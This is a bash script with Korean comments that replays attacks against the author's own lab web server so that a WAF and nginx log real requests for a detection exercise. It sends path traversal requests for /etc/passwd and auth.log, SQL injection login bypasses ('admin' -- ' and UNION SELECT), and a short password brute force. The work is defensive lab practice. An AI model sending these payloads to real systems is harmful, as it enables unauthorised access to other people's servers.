#!/usr/bin/env bash
# =============================================================================
# replay.sh — 실제 공격을 웹 서버에 쳐서 진짜 로그를 만든다
# =============================================================================
#
#  구성도 1번 칸의 "요청 payload" 를 실제로 채우는 스크립트입니다.
#  합성 로그(fixtures)가 아니라, 이 서버가 받은 진짜 요청을 남깁니다.
#
#  공격자 관점에서 web 의 공인 IP 를 때립니다. 대상 IP 는 껐다 켜면 바뀌므로
#  (RUNBOOK 참고) terraform output web_public_ip 로 확인해 인자로 줍니다.
#
#      bash replay.sh http://<web_public_ip>
#
#  세 가지를 순서대로 재현합니다. 계층도·경보 룰 3종과 1:1 로 맞춥니다.
#    A. Path traversal  — LFI. 미끼로 새는 200 과 봉쇄되는 404 를 둘 다 만듦
#    B. SQL injection   — 로그인 우회. WAF 경보 + payload 캡처
#    C. Brute force     — 401 반복 뒤 1건 200 (성공)
set -euo pipefail

BASE="${1:-http://localhost}"
UA="kisiyaho-redteam/1.0"
say() { printf '\n\033[1;33m== %s\033[0m\n' "$*"; }

say "A. Path traversal (LFI)"
# 미끼 트리 안 → 200 (성공한 것처럼 보이지만 새는 건 가짜 passwd)
curl -s -o /dev/null -w "  decoy passwd -> %{http_code}\n" -A "$UA" \
  "$BASE/portal/index.php?page=../../../kisiyaho-decoy/etc/passwd"
# open_basedir 밖 → 404 (WAF 도 잡고 앱도 막음)
curl -s -o /dev/null -w "  real passwd  -> %{http_code}\n" -A "$UA" \
  "$BASE/../../../../etc/passwd"
curl -s -o /dev/null -w "  auth.log     -> %{http_code}\n" -A "$UA" \
  "$BASE/portal/index.php?page=../../../../var/log/auth.log"

say "B. SQL injection (로그인 우회)"
# ' OR '1'='1 로 인증 통과 시도. 요청 본문(payload)이 modsec 로그에 남음
curl -s -o /dev/null -w "  ' OR '1'='1  -> %{http_code}\n" -A "$UA" \
  --data-urlencode "user=admin' -- " --data-urlencode "pass=x" \
  "$BASE/portal/login"
curl -s -o /dev/null -w "  UNION SELECT -> %{http_code}\n" -A "$UA" \
  --data-urlencode "user=x' UNION SELECT 1,2,3 -- " --data-urlencode "pass=x" \
  "$BASE/portal/login"

say "C. Brute force (401 반복 후 1건 성공)"
for pw in wrong1 wrong2 wrong3 wrong4 wrong5; do
  curl -s -o /dev/null -w "  guest/$pw -> %{http_code}\n" -A "$UA" \
    --data-urlencode "user=guest" --data-urlencode "pass=$pw" \
    "$BASE/portal/login"
done
# 마지막에 진짜 비번(seed.sh 의 guest/guest) → 200
curl -s -o /dev/null -w "  guest/guest -> %{http_code}  (성공)\n" -A "$UA" \
  --data-urlencode "user=guest" --data-urlencode "pass=guest" \
  "$BASE/portal/login"

say "끝. 서버에서 확인:"
cat <<'TIP'
  # payload(요청 본문)가 실제로 잡혔는지 — 이게 이번 주 핵심 산출물
  grep -c '"C":' /var/log/modsec_audit.json      # C 파트 = 요청 본문
  tail -n1 /var/log/modsec_audit.json | python3 -m json.tool | less

  # 상관분석용: 같은 IP 가 modsec(경보)와 nginx(200) 양쪽에 있는지
  tail /var/log/nginx/access.log
TIP
